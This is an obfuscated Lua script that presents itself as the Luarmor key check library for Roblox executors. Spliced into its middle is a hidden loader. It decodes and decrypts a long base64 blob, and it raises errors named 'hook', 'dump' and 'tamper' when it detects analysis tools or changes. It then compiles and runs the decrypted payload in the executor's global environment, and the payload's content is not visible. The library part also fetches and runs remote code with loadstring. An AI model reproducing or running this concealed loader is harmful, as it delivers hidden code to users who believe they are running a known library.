                                                            --]                                                 
                                                                  --[]                                          
                                                                  --[]                                          
                                                local a;local b=--[]                                            
                                            (pcall(getfenv)and _G or _G)["This is t"..                          
                                             "he key check libr"..                                              
                                                                --                                              
                                          "ary used by Luarmor,"..                                              
                                           " documentation can be"..                                            
                                              " view"..   "ed at h"..                                           
                                              "ttps://docs.luarmor."..                                          
       "net/luarm"..                          "or-user-manual-and-"..                       "f.a.q#key"..       
     "-check-library"]    do                  local function c                  (d)       return d%--[[==]]     
    4294967296 end;                           local function e(          f,      g)      local h,i=0,1;while     
  f>0 or g>0 do local j=            f%2;      local k=g%2;if j~=       k then           h=h+i end;f=math.floor(   
  f/2)g=math.floor(g/2)i=i*         2         end;return h end;                     local function l(d,m)--[]]  
  return c(d   *2^m)end;local                 function n(d,m)                  return math.floor(   d/2^m)%--]  
  4294967296    end;function a(o)local   p={    [1]=0x5ad69b68,[2]=          0x03b7222a,[3]=--[[{]]   0x2d074df6  
  ,[4]=        0xcb4fff2d}local q={[1  ]=     0x01c3,[    2]=              0xa408,[3]=0x964d,[4]=   0x4320}--]  
  local r=#o   ;local s=1;while s<=r   do            local           t=0   ;for u=0,3 do local v=   s-1+u;if v  
  <r then      local w=o:byte(v+1)t=t  +w*2   ^(8*u)end end;t=c(t)   for    x=1,4 do local y=e(p[x   ],t)local   
  z=p[x%4+1]   y=e(y,z)y=  c(l(y,5)+n  (y,2   )+q[x])local A=(x-1)   *5%   32;local B  =n(t,A)y=e   (y,B)y=c(y  
  )local C=p   [(x+1)%4+1  ]y=c(y+C)p  [x]=   c(y)end;s=s+4 end;     for    x=1,4 do    local y=p[   x]local D=  
  p[x%4+1]     local E=p[  (x+2)%4+1]  y=c(   y+D)y=e(y,E)local A=   x*7   %32;y=c(l(  y,A)+n(y,    32-A))p[x]  
  =y end;      local F={}  for x=1,4   do F   [x]=string.format(           "%08X",p[x  ])end;       return --]  
  table.       concat(F)   end end;           local G;local H=game and game.GetService and game:GetService("HttpS".."ervice")or{}
  local        function I  (J)return    H:    JSONDecode(J)end;            local K=    syn and      syn.--[[]]  
  request or    request or   --[[: or]]         http_request;local           function L  (M)local N   =os.time()  
  M=tostring   (M)G=       tostring(G   )     local O=K({Method=    ""..   "GET",Url=  "https:"..   "//sdka"..  
  "pi-pub"..   "lic.lu"..  "armor."..   "n"..  "et/sync"})O=I(O.   Body)   local P=O.  nodes;       local Q=P[  
  math.        random(1,#  P)]local R    =Q..   "check_key?key="   ..M     .."&scr"..  "ipt_id="    ..G;local   
  S=O.st;      local T=S-  N;N=N+T;O=     K({    Method="GET",    Url=     R,Headers=  {["clie"..   "nttime"]=  
  ""..N,[      "catcat"..  "128"]=a(M      ..     "_cfver1.0_"   ..G       .."_time_"  ..N)}})      return I(O  
  .Body)end;   local       function U       ()G=    tostring   (G)if        not G:      match(""..   "^[a-f0"..  
  "-9]{32}$"   )then       return end        ;                pcall        (writefile  ,G.."-c"..   "ache.lua"  
  ,"recac"..   "he is "..  "requi"..          "red")        wait(          0.1)pcall(  delfile,G    .."-cac"..  
  "he.lua")    end;local   function             V()      --[[+]]            --[[for]]  loadstring   (game:--[]  
  HttpGet(     "https:"..  "//ap"..        ""..   "i.luarmo"..               "r.ne"..  "t/file"..   "s/v3/l"..  
  "oaders/"    ..--[[,]]   --[[/]]                   --[[]]                   --[[%]]  tostring(G   )..".lua")  
  )()end;
local p="y9WPh7i9wGHE".."b9WSH3ZidjCf".."6ccAYfWJd9nI".."+2191a5gbrXf".."w7iEoN8J8+g8".."DhTo0HinrJ8N".."OK/gRGvX5iir".."8GTpemF3FRB0".."orzAexDBZvot".."86yPVW9dXkI4".."34yyKCTUPTbC".."ZfpHMl7h846t".."voxJjarQhpRl".."1AVQFv45EsKD".."lp2sP9Hbe/jF".."5FVhAK/HDElh".."H6HO2RcOvxHE".."wsV1ghUA98S8".."M/Frhe6JLYkX".."xMClua+KsPEF".."Md8rRT5CgbYv".."YIxqkplZ9Swr".."Fxwue+MAR0Pr".."QfwwN9hzIMcp".."IiHb/oD2meVJ".."3g2yzQzb+gsc".."SufwOk8Fe93Z".."ndJ8id7QUG9i".."7Hb8cK/ZDR7b".."+blKROU896ha".."hZExq93x+i66".."Z8nee2g99iDE".."o61a7tQd7Sdx".."OE8pfXdrzlAs".."l8l/jWr4+V8O".."4RWMoiJAJeT/".."O8ZQ22+BQioJ".."DyvZxvTkCYPf".."ThqdBbf1BnSd".."Jdan6GU/jt9T".."HHQuZaWMLaJ8".."dJDg27ipp5/5".."1wGToROFFohn".."ICZFmEC7qaFi".."Ea78z67XdiJP".."J9kk8e0Fh8JX".."FS8+UyUgjZPt".."mgr8ZFNdAtwB".."IXcx/uv5lAhX".."03RVjZFZyiL4".."L6/uZVlBl9b/".."DmlsEmK3V1cs".."gVNYrLeuqGkR".."/7Lywm5ODK2S".."U+vNdqnRmzF2".."MWs2e2LJymD4".."RUpMeFs9P2ts".."XF7xAwE1fvtN".."1PweXvZfrlqV".."BU6639O3oQif".."zyMXbsd9wp6z".."3X08o3EKvyhO".."xgqcVb4MnNI5".."Iv/b6QkeHO0m".."yUegE2wGWWow".."LdrfQWUIx/Ko".."H4Wztjs/ADPA".."gnkv6S/cDEPn".."jCXVWULNaE4z".."do5n/Sjllbs/".."ElwdOCDmdJnr".."sxuOQR/At0dg".."t7tH3+ZYffTL".."UM7hDERnke3D".."yudS6ELuEdJD".."cJy+WmGfwu3h".."JpSQHHqwJmiO".."4Gz3d9HKplnb".."rOBwfhg9whid".."dOrsEyjIglaC".."2i/QwwKQjA+l".."yCbI3fwIjILv".."mbFsW4toJS8Y".."bSuLo6qRvf/u".."Qsllv3nLfzre".."birw4/ivoruX".."6tWijOfMZeEC".."7vXQ7kGKbAB2".."HYATUgpa9U+G".."VZ4UB5BcFcma".."Isu+YT6KGHYI".."Fe7LDLRyg3Do".."8XlAkP6bEP8p".."Uu7XDwUhjkoj".."MGRJcFqXBN2V".."xlDMRnJ38xwS".."GyN5BWrS7dqI".."F9MrRuIk4z0s".."0xB4oQ+rdxGu".."JSqdQXK8Sb5h".."FgPw3HMlqsTD".."0jtPibBH+7zw".."mJt98P1pOttp".."wrJa3yNnQ6eG".."NeDPw2Wwt2iQ".."f33gmVA8AWrW".."r7duWOHlOYZF".."xYoYOTHnZyvP".."YZcrgCr52Ryv".."SU2cnrw95Rzz".."PaBePEpjuQze".."Ltja4mmBiOKP".."kMSAYNPoQaZs".."s4n8jhQeXnE5".."Y2tUvBW+L4hs".."BIf9GB4GOAfj".."lG6BRUfqxtX6".."K//TUEYvm1xA".."JJ+y5LsRY6Is".."p8t4B12A7NrG".."Idv8Twuw8u2+".."2q5eAxoF6Waq".."AlVz89ciAXVY".."iBA6kFv3M/qG".."G4N1j0dKGbHr".."5LjW4Y3Gyn2D".."HIk8++RJqQP5".."pY65k1Qs3L/L".."bcBEDZwewAv5".."/qcPNtTg07/G".."q1Racb0AwRnT".."u2zYbg40GDmL".."txOAWu5yheRB".."4R0Y7+ce0ogm".."Y0xI8NnsSyXR".."IgMKJYFmpNSI".."8IHGNICBLa06".."iRN/qiAGKn47".."dKHm9l8niUjp".."1XQUjiXwH8O2".."/jQNB0V6NsFx".."ddsWWrK8yBFp".."a7K5l7YUSVP+".."tCOzZT07TZJy".."nmOO8K+s4dmc".."0QMQl8cik0CD".."fDEqV13m0dfJ".."clm83GT7AuHt".."AT/6JNxcGp34".."XWSv3Ze4Vev0".."a+BUnpId0Ipn".."NAa2yVfbP07y".."eeVJYZ/rAbm3".."tETYu7mIy/5I".."LNkQNYeXSfwx".."ekY4Ncfiow/6".."rya7BMgq5V7D".."Wqitto7LHhqG".."w/OkzZ2R2Ior".."kyz1DpszidUz".."VEHVe9AkUzZg".."tcHddwYF/um+".."3lpVk9TCReAv".."Gr7OeM4H5gec".."hABUCoEAg6D2".."O59csly2xT5U".."sa2ot6IanuWQ".."A6ubOQ2KvgOh".."RKLrT6wHKo/R".."X9LMmbUZtlVT".."bHb47rOPP0mL".."v6QSTwF6ggGY".."EQfOcoCIycsj".."kveJCT5wnYG4".."qEu3Zlwiw87u".."Ow18BpUdxiJp".."+27i220Gk4jO".."5qB7ihYjBkMo".."aWMkKb83Ra9J".."OPvc+VhmOFli".."otzGWj2hRmGf".."BbUM4ebX6/og".."OxpII2pcAEqP".."ZLmtaDUFgHpj".."VX0SF3XyZtlq".."O8no86Ryk4R1".."cOiCXD6qMmkF".."+i0ctQtlvm0a".."XO59HWLi8PPM".."Bls7tAei8vB7".."v46+icRTOemJ".."H5k5i+t8/nww".."r6GufQXsLJh0".."6n3q9UGs4uW/".."Uz+PG6ou95p8".."d8c9gYIGhPjm".."OA7SPvQfw0kC".."p6XVh9N8d+Hp".."cvpduw5YSvoU".."y+qM/QAJCDJl".."723p2F/T0yfn".."F8lRG6XAtjay".."J7XmA3sAUpNy".."+UT2zuKJ26xA".."YGrYes14980x".."eIxEm2CHMyn+".."eyOtB52sLWy6".."baFXsSfhtai+".."oZ62ZPkekvV1".."1389xolrSXTz".."vHiEfEJ8LUQT".."xmZqtlbsEjG9".."R3Mva1dsdaIw".."3MADTTOllmw6".."dloc2oXDCuMg".."tCh7/g+CvXXY".."EeomsLV/Dm0+".."VP/7ghxrCXuu".."FEVXCgo8InZS".."6JNZFDt/0aW6".."aUWV7wBVetbY".."GYXh9recbuse".."hlroW/Y9kCcr".."8fbsiy1fq8H5".."kB9xTq0vAg+6".."UZgJS4LSobbi".."0g2jqyD8V6se".."RmbU5ul1cBbI".."9eN33yCWx487".."ULJYfGOSHlX8".."vZDXAqVt/u9+".."tnpYV8b5QFIU".."Ry55eV+gJ+J7".."okEalBcR7aNj".."JM9sbpRfuw49".."JlkzbF8FGI8s".."64J8fGsVXoQI".."GnnlCk9RjDuZ".."y7ycsmOQNvSj".."gfCGR2TRxFqf".."XIw5TYOXu6+E".."wdgfin/riCry".."QggJUbCcaWtU".."/Y9PDEyyx6uy".."JUyOUrWzgPzN".."SnhqJQwx7XBS".."Kk3XIarh44OA".."uKT6pD9Tgsr6".."ZIMrE7DrUsga".."EiG6b9jjciPj".."R1A5c57S1DRj".."oA8eStmf8Uif".."cPkmgFYeGdaB".."1VdNuykNv1o/".."s1IdgB+tiltN".."nK12Uy4tt1i5".."qIqYBY5WKqj7".."cBoM7sIbD/0X".."+2J878fUstWF".."qDwzvcd0mipl".."ggIT8eTGgU3F".."Jbm6J8QmNse1".."eMYkJc4dN82x".."q+K4HTVhJfIc".."s2dRxA17h2hw".."Z+ZccuZppd9+".."ASb/hZdOhraH".."Pj7G3PeizZGy".."Z3jBS4k2+o1q".."7fe6lPJ8itMr".."qW3kReTGG4Gr".."vKrrqEt8ggaF".."K0/AFXmOSaxN".."Qm31J5qtteum".."l3fUXsA8fT8+".."63L+2oOcwtpA".."EenQI6oV2WsT".."rGNJpUyXsPxh".."9JWk0LR9/DOU".."R0adXBAcd5h2".."dxnjIlF8E8RJ".."84G6waCGcb+t".."Wetv0DNDzdNM".."XBY54DkryLfD".."ZJsz5avlywKJ".."UMys3UofMRVy".."dGXi8Q2iuGVy".."DiuqAY7az0HB".."Be/gRDuntar5".."j905EeqVIONZ".."9roAiITgSwVC".."BcqrN9ZgffLp".."3gEEbHLirZ0a".."y2L5TcjLUGDY".."X+SSUt7qEEVf".."vk1jgO60AE5t".."OEn+tTDLc+As".."5iSvkv3cL0s2".."V/G8Sa9r90ul".."SNfvOOD2+waq".."zgdfdC2T/rMg".."UuHXM4FP1JcZ".."AJDeTgDpQmAV".."uctg+LZz7fjD".."3scwr4h5zTv0".."XBbOtc/9dQYo".."43/qKKx26Ogn".."vdow3Ofguox4".."DZ4kOUwKnEmK".."qLJBzhtPA8yS".."MoVhgbg30Asx".."RQ6bMieYnBlr".."hTfYTbYvL23C".."jII9Iv+fE71g".."OkF1nEldxYMN".."7n2Psc2rryjx".."dST2TQ"
local q={0x72,0x14,0x2b,0xbb,0x7b,0x50,0xd4,0xc2}
local function hk(fn)
if type(fn)~="function" then return false end
if type(isfunctionhooked)=="function" then local ok,h=pcall(isfunctionhooked,fn) if ok and h then return false end end
if type(iscclosure)=="function" and type(islclosure)=="function" then local cOk,c=pcall(iscclosure,fn) local lOk,l=pcall(islclosure,fn) if cOk and lOk and l and not c then return false end end
if debug and type(debug.info)=="function" then local ok,src=pcall(debug.info,fn,"s") if ok and type(src)=="string" and src~="[C]" and src~="=[C]" then return false end end
return false
end
if hk(string.char) or hk(string.byte) or hk(table.concat) or hk(math.floor) or hk(pcall) then error("ho".."ok") end
local sc=string.char local sb=string.byte local tc=table.concat local mf=math.floor local ss=string.sub
local function ee(f,g) local h,i=0,1 while f>0 or g>0 do local j,k=f%2,g%2 if j~=k then h=h+i end f=mf(f/2) g=mf(g/2) i=i*2 end return h end
local SA=228 local MK=56
local B="ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/" local T={} local ti=1 while ti<=64 do T[sb(B,ti)]=ti-1 ti=ti+1 end
local function d1(s) local o,v,n,i={},0,0,1 while i<=#s do local z=T[sb(s,i)] i=i+1 if z~=nil then v=v*64+z n=n+1 if n==4 then o[#o+1]=sc(mf(v/65536)%256) o[#o+1]=sc(mf(v/256)%256) o[#o+1]=sc(v%256) v=0 n=0 end end end if n==2 then o[#o+1]=sc(mf(v/16)%256) elseif n==3 then v=v*64 o[#o+1]=sc(mf(v/65536)%256) o[#o+1]=sc(mf(v/256)%256) end return tc(o) end
local function d2(src) local o={} local i=1 local n=#src while i<=n do local flags=sb(src,i) i=i+1 local bit=0 while bit<8 and i<=n do if mf(flags/2^bit)%2==1 then local dist=sb(src,i) local len=sb(src,i+1)+3 i=i+2 local base=#o-dist local k=1 while k<=len do o[#o+1]=o[base+k] k=k+1 end else o[#o+1]=sc(sb(src,i)) i=i+1 end bit=bit+1 end end return tc(o) end
local function d3(s) local n=0 local i=1 while i<=#s do n=(n*131+sb(s,i))%4294967296 i=i+1 end return n end
local function d4(R) local o={} local bi=0 local prev=SA local n=#R while bi<n do local by=sb(R,bi+1) local kb=ee(q[(bi%#q)+1],(MK+(bi%8)*17)%256) local cur=by by=ee(by,prev) prev=cur local add=(bi*13+SA)%256 by=(by-add)%256 by=ee(by,kb) o[#o+1]=sc(by) bi=bi+1 end return tc(o) end
if hk(sc) or hk(sb) or hk(tc) then error("du".."mp") end
local r1=d4(d1(p))
local s1=sb(r1,1)==1 and d2(ss(r1,2)) or ss(r1,2)
if d3(s1)~=3718943538 then error("ta".."mper") end
local function EX() if type(getgenv)=="function" then local ok,e=pcall(getgenv) if ok and type(e)=="table" then return e end end if type(getfenv)=="function" then local ok,e=pcall(getfenv) if ok and type(e)=="table" then return e end end return _G end
local E=EX() local fn=loadstring or load
if type(E.loadstring)=="function" then fn=E.loadstring end
if type(fn)~="function" and type(E.load)=="function" then fn=E.load end
if type(fn)~="function" then error("com".."pile") end
local g=fn(s1) s1=nil
if type(g)~="function" then error("com".."pile") end
if type(setfenv)=="function" and (E.game~=nil or type(E.string)=="table") then pcall(setfenv,g,E) end
g()
return      --[[]]           --[[% ]]        --[[# ]]           --[[]]   --[[<= ]]   --[[<= +]]  
  --[[} ; ]]   --[[+ ]]                     --[[/ ]]        --[[==]]                     --[[==]]   --[[{ ( ]]  
  --[[^ ; ]]   --[[~=]]                                                                  --[[* ]]   --[[do #]]  
  --[[^ do]]   --[[]]                                                                      --[[]]   --[[goto]]  
  --[[+ do]]                                                                                        --[[~= /]]  
  --[[} % ]]                              setmetatable(  {},{__index=                               function(W  
  ,X)local Y   =                    a(X)if Y=="3"..          "0F75B193B94"..                        "8B4E96"..  
  "514636"..                      "5A85CBCC"then                 return L end;                       if Y==""..  
  "2BCEA"..                             "36EB"..                "24E2"..                             "50BBA"..  
  "B188"..                            "C"..                          "7"..                            "3A74"..  
  "DF10"                                                               then                            return U   
  end;if                               Y==                                                               "75"..  
  "6"..                                                                                                  "2"..  
                                                                                                                
"4F56542822D214B1FE25E8798CC6"then return V end;return nil end,__newindex=function(W,Z,_)if Z=="script_id"then G=_ end end})

--[[sitar:v1]]
